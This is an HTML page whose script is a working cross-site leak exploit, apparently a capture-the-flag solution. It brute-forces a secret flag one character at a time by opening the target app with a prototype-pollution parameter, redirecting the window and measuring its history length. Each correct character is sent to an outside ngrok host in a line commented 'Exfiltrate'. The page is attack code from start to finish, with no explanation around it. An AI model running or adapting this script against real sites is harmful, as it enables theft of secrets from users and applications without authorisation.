<html>
    <body>
        <script>
            const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{_}';

            const sleep = (ms) => {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
            
            const tryCharacter = async (correctSoFar, guess) => {
                
                let opened = window.open(`http://app:80/?search=${correctSoFar + guess}&token=&__proto__[accessGranted]=pwned`);

                // Allow 30 seconds for the navigations to happen
                await sleep(30000);
                opened.location = "http://5de9-115-66-128-224.ngrok.io/nothing.txt";

                // Allow 30 seconds for the redirects to complete
                await sleep(30000);

                return [opened.history.length === 3, guess];
            }

            let correctSoFar = "SEE{w4k3_up_5h33pl3_1t's_obv10us";

            for (let i=0; i < alphabet.length; i++) {
                guess = alphabet[i];

                tryCharacter(correctSoFar, guess).then(resp => {
                    let [success, guess] = resp;
                    console.log(success, guess)

                    if (success) {

                        // Exfiltrate
                        fetch("http://5de9-115-66-128-224.ngrok.io/" + guess);
                    }
                })
            }
            
        </script>
    </body>
</html>
